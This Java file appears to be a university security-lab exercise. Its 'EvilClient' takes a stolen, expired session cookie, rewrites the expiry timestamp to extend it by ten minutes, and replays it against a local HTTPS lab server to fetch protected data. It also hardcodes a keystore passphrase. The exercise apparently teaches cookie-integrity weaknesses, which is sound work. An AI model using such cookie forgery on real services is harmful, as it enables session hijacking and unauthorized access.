package ch.fhnw.apsi.lab1;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManagerFactory;

public class EvilClient {
  
  private SSLSocketFactory sslSocketFactory;
  private URL url;
  private String cookie;
  
  private static final Logger LOGGER = Logger.getLogger(EvilClient.class.getName());

  
  public void setUpConnection() throws IOException, KeyStoreException, NoSuchAlgorithmException, CertificateException, KeyManagementException {
    // set SSL context of the connection and trust the self-signed certificate of the server
    
    url = new URL("https://localhost:8000/lab1");
    
    char[] passphrase = "mypassphrase".toCharArray();
    KeyStore ks = KeyStore.getInstance("JKS");
    ks.load(new FileInputStream("resources/Server.keystore"), passphrase);
    
    TrustManagerFactory tmf = TrustManagerFactory.getInstance("SunX509");
    tmf.init(ks);
    
    SSLContext sslContext = SSLContext.getInstance("TLS");
    sslContext.init(null, tmf.getTrustManagers(), null);
    
    sslSocketFactory = sslContext.getSocketFactory();
  }
  
  public void tamperExpiredCookie(String expiredCookie) {
    // tamper a (stolen) expired cookie by setting another expiration time
    
    String[] cookieParts = expiredCookie.split("&");
    String newCookie = "session=exp=" + (System.currentTimeMillis() / 1000 + 600);
    for (int i=1;i<cookieParts.length;i++) {
      newCookie = newCookie + "&" + cookieParts[i];
    }
    LOGGER.log(Level.INFO, "Tampering expirde cooke:");
    LOGGER.log(Level.INFO, "expired cooke: "+expiredCookie);
    LOGGER.log(Level.INFO, "new fake cooke: "+newCookie);
    
    cookie = newCookie;
  }
  
  public String tryToSnatchSecretInformation() throws IOException {
    // try to get the secret information by constructing a 
    // authentication is achieved by showing the cookie retrieved from the server
    
    HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
    HttpsURLConnection securedConnection = (HttpsURLConnection) httpConnection;
    securedConnection.setSSLSocketFactory(sslSocketFactory);
    
    securedConnection.setRequestMethod("GET");
    securedConnection.setRequestProperty("Cookie", cookie);
    securedConnection.setUseCaches (false);
    securedConnection.setDoInput(true);
    securedConnection.setDoOutput(true);
    securedConnection.connect();
    
    LOGGER.log(Level.INFO, "Sent Cookie: " + cookie);
    
    InputStream is = securedConnection.getInputStream();
    BufferedReader br = new BufferedReader(new InputStreamReader(is));
    String line;
    StringBuffer response = new StringBuffer(); 
    while((line = br.readLine()) != null) {
      response.append(line);
      response.append("\n");
    }
    br.close();
    securedConnection.disconnect();
    
    return response.toString();
  }
}
